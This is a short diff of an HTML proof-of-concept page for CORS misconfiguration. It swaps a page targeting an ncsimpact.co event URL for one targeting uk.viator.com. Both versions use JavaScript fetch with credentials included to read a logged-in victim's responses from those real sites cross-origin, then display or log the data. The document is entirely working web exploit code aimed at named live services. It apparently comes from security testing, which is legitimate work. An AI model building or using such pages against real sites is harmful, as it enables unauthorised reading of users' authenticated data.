@@ -1,26 +1,18 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-  <title>CORS No-Login PoC</title>
-</head>
-<body>
-  <h2>CORS Test - No Login, No Registration</h2>
-  <pre id="output">Waiting for response...</pre>
-
-  <script>
-    fetch("https://www.ncsimpact.co/event/c77d5285-53fc-4756-8ba8-1d4b8cda68f0/Home", {
-      method: "GET",
-      credentials: "include"
-    })
-    .then(response => response.text())
-    .then(data => {
-      document.getElementById("output").textContent = "Response data:\n" + data;
-      console.log("Response data:", data);
-    })
-    .catch(error => {
-      document.getElementById("output").textContent = "Error: " + error;
-      console.error("Fetch error:", error);
-    });
-  </script>
-</body>
+  <body>
+    <h1>CORS Misconfiguration PoC</h1>
+    <script>
+      fetch('https://uk.viator.com', {
+        method: 'GET',
+        credentials: 'include'
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log('Response from uk.viator.com:', data);
+        alert('Check the console for response!');
+      })
+      .catch(err => console.error('Error:', err));
+    </script>
+  </body>
 </html>
